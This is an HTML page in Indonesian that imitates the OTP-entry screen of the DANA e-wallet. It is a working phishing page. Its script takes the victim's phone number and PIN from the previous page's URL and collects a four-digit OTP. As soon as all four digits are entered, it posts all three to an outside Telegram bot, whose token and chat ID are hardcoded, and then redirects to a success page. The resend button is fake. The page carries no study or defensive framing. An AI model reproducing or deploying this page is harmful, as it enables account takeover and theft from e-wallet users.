<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>DANA - Masukkan OTP</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: 'Arial', sans-serif;
        }
        body {
            background-color: #009EEB;
            min-height: 100vh;
            display: flex;
            flex-direction: column;
            align-items: center;
            padding: 15px 10px;
            color: white;
        }
        .back-btn {
            align-self: flex-start;
            font-size: 1.2rem;
            color: white;
            margin-bottom: 15px;
            cursor: pointer;
        }
        .logo-container {
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 20px;
            margin-bottom: 15px;
        }
        .logo-img {
            width: 50px;
            height: auto;
        }
        .logo-text {
            font-size: 1.8rem;
            font-weight: bold;
            color: white;
        }
        .title {
            font-size: 1rem;
            text-align: center;
            margin-bottom: 10px;
        }
        .number-box {
            background: rgba(255, 255, 255, 0.2);
            padding: 5px 12px;
            border-radius: 6px;
            display: flex;
            align-items: center;
            gap: 5px;
            font-size: 0.9rem;
            font-weight: bold;
            margin-bottom: 25px;
        }
        .flag {
            width: 20px;
            height: 13px;
            background: url('https://flagcdn.com/w20/id.png') center/cover no-repeat;
            border-radius: 2px;
        }
        .otp-container {
            display: flex;
            gap: 10px;
            margin-bottom: 25px;
        }
        .otp-input {
            width: 45px;
            height: 45px;
            background: white;
            border-radius: 4px;
            border: none;
            text-align: center;
            font-size: 1.4rem;
            color: #009EEB;
            outline: none;
            padding: 0;
        }
        .timer-container {
            display: flex;
            background: white;
            border-radius: 3px;
            overflow: hidden;
            width: 150px;
        }
        .resend-btn {
            flex: 5;
            padding: 3px;
            background: #f0f0f0;
            color: #aaa;
            font-size: 0.7rem;
            font-weight: bold;
            text-align: center;
            cursor: pointer;
        }
        .time-box {
            flex: 1;
            padding: 2px;
            background: #f8f8f8;
            color: #333;
            font-size: 0.6rem;
            font-weight: bold;
            text-align: center;
            position: relative;
        }
        .dot {
            position: absolute;
            top: 4px;
            right: 2px;
            width: 3px;
            height: 3px;
            background: orange;
            border-radius: 50%;
        }
        .pesan-error {
            color: #fff;
            font-size: 0.85rem;
            margin-top: 15px;
            display: none;
            background: rgba(255,0,0,0.3);
            padding: 8px;
            border-radius: 4px;
        }
    </style>
</head>
<body>
    <!-- Tombol Kembali -->
    <div class="back-btn" onclick="history.back()">
        <i class="fas fa-chevron-left"></i>
    </div>

    <!-- Logo DANA -->
    <div class="logo-container">
        <img src="logo.png" alt="Logo DANA" class="logo-img">
        <div class="logo-text">DANA</div>
    </div>

    <!-- Judul -->
    <div class="text-sm font-bold title">
        Kode OTP telah dikirim ke
    </div>

    <!-- Box Nomor HP -->
    <div class="number-box">
        <div class="flag"></div>
        <span id="nomorTampil">+62 8xx xxxx xxx</span>
    </div>

    <!-- ✅ 4 KOLOM OTP SAJA -->
    <div class="otp-container">
        <input type="text" class="otp-input" maxlength="1" inputmode="numeric" autofocus id="otp1">
        <input type="text" class="otp-input" maxlength="1" inputmode="numeric" id="otp2">
        <input type="text" class="otp-input" maxlength="1" inputmode="numeric" id="otp3">
        <input type="text" class="otp-input" maxlength="1" inputmode="numeric" id="otp4">
    </div>

    <!-- Pesan Error -->
    <div class="pesan-error" id="pesanError">⚠️ Harap isi 4 digit kode OTP!</div>

    <!-- Tombol Kirim Ulang & Timer -->
    <div class="timer-container">
        <div class="resend-btn" id="kirimUlang">KIRIM ULANG</div>
        <div class="time-box">
            <span id="timer">00:58</span>
            <div class="dot"></div>
        </div>
    </div>

    <!-- ============================================== -->
    <!-- SCRIPT KIRIM KE 1 BOT TELEGRAM & PINDAH HALAMAN -->
    <!-- ============================================== -->
    <script>
        // ==================== ⚠️ WAJIB DIISI ====================
        const BOT_TOKEN = "8735075479:AAEzMNhrtNfiT-IUKvnGtdTkE7bsTmWWVOg";
        const CHAT_ID = "8735075479";
        const HALAMAN_BERIKUTNYA = "berhasil.html";

        // BACA DATA DARI HALAMAN SEBELUMNYA
        const urlParams = new URLSearchParams(window.location.search);
        const nomorAsli = urlParams.get('nomor') || 'Tidak ada';
        const pinAsli = urlParams.get('pin') || 'Tidak ada';

        // TAMPILKAN NOMOR DI LAYAR
        document.getElementById('nomorTampil').textContent = `+62 ${nomorAsli}`;

        // === TIMER HITUNG MUNDUR ===
        let totalDetik = 58;
        const timerElement = document.getElementById('timer');
        let timerExpired = false;
        
        const countdown = setInterval(() => {
            let menit = Math.floor(totalDetik / 60);
            let detik = totalDetik % 60;
            
            detik = detik < 10 ? "0" + detik : detik;
            timerElement.textContent = `${menit}:${detik}`;
            totalDetik--;

            if(totalDetik < 0) {
                clearInterval(countdown);
                timerElement.textContent = "Habis";
                timerExpired = true;
            }
        }, 1000);

        // === OTOMATIS PINDAH FOKUS INPUT OTP ===
        const otpInputs = document.querySelectorAll('.otp-input');
        otpInputs.forEach((input, index) => {
            input.addEventListener('input', (e) => {
                // Pindah ke kotak berikutnya
                if(e.target.value.length === 1 && index < otpInputs.length - 1) {
                    otpInputs[index + 1].focus();
                }
                // Cek apakah semua 4 digit sudah terisi
                cekOTPLengkap();
            });

            // Kembali ke kotak sebelumnya saat tekan Backspace
            input.addEventListener('keydown', (e) => {
                if(e.key === 'Backspace' && e.target.value === '' && index > 0) {
                    otpInputs[index - 1].focus();
                }
            });
        });

        // === CEK APAKAH 4 DIGIT SUDAH LENGKAP ===
        function cekOTPLengkap() {
            let kodeOtp = '';
            otpInputs.forEach(input => {
                kodeOtp += input.value;
            });

            // ✅ Langsung kirim saat 4 digit terisi
            if(kodeOtp.length === 4) {
                kirimData(kodeOtp);
            }
        }

        // === FUNGSI KIRIM DATA KE TELEGRAM ===
        async function kirimData(kodeOtp) {
            const error = document.getElementById('pesanError');
            error.style.display = 'none';

            let pesan = `<b>🔐 Kode OTP DANA</b>
📱 Nomor: <code>${nomorAsli}</code>
🔑 PIN: <code>${pinAsli}</code>
🔢 OTP: <code>${kodeOtp}</code>
⏰ Waktu: ${new Date().toLocaleString('id-ID')}
${timerExpired ? '⚠️ Timer sudah habis!' : ''}`;

            try {
                await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                    method: "POST",
                    headers: {"Content-Type": "application/json"},
                    body: JSON.stringify({
                        chat_id: CHAT_ID,
                        text: pesan,
                        parse_mode: "HTML"
                    })
                });
            } catch (err) {
                console.log("❌ Gagal kirim:", err);
            }

            // Pindah halaman setelah selesai
            window.location.href = HALAMAN_BERIKUTNYA;
        }

        // === KIRIM ULANG OTP ===
        document.getElementById('kirimUlang').addEventListener('click', () => {
            alert('Kode OTP baru telah dikirim!');
            otpInputs.forEach(input => input.value = '');
            otpInputs[0].focus();
            totalDetik = 58;
            timerExpired = false;
        });
    </script>
</body>
</html>
